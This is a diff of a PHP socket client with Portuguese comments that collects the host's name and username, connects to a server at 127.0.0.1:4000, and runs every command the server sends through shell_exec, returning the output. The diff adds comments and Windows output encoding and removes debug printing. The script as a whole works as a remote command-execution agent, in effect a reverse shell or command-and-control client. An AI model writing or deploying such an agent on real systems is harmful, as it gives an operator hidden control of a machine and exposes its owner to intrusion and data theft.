@@ -10,6 +10,7 @@ use Ramsey\Uuid\UuidFactory;
 
 $operationSystem = PHP_OS_FAMILY;
 
+// Executa rotinas de descoberta de variáveis de ambiente baseadas no SO anfitrião
 if ($operationSystem == 'Windows') {
     exec('echo %USERNAME%', $output);
     $username = $output[0] ?? 'unknown';
@@ -32,6 +33,7 @@ socket_connect($socket, '127.0.0.1', 4000);
 
 echo "Conectado ao socket server\n";
 
+// Monta o payload inicial com a identificação única gerada para o handshake primário
 $info = json_encode([
     'hostname' => $hostname,
     'username' => $username,
@@ -54,34 +56,37 @@ while(true) {
         }
 
         echo socket_strerror($socketCode);
-
         break;
     }
 
+    // Processa os sinais de execução remota de shell enviados pelo servidor socket central
     if (strpos($response, 'DATA_EVENT:') !== false) {
         echo 'Recebeu command' . PHP_EOL;
 
         $dataJson = str_replace('DATA_EVENT:', '', $response);
-
         $dataArray = json_decode($dataJson, true);
-
         $command = $dataArray['event'];
 
         echo "COMMAND: {$command}" . PHP_EOL;
 
+        // Dispara a chamada de sistema de baixo nível para a console nativa
         $output = shell_exec($command);
 
         echo 'Executou command' . PHP_EOL;
+
+        // Executa a conversão de caracteres nativos do prompt Windows para compatibilidade JSON
+        if ($operationSystem == 'Windows' && !empty($output)) {
+            $output = mb_convert_encoding($output, 'UTF-8', 'CP850');
+        }
 
         $dataJson = json_encode([
             'output' => $output
         ]);
 
+        // Retorna a cadeia de caracteres sanitizada em bloco único TCP
         socket_write($socket, "DATA_EVENT:{$dataJson}");
 
         echo "Mandou ouput do command para server" . PHP_EOL;
-        var_dump($dataJson);
-
         continue;
     }
 }
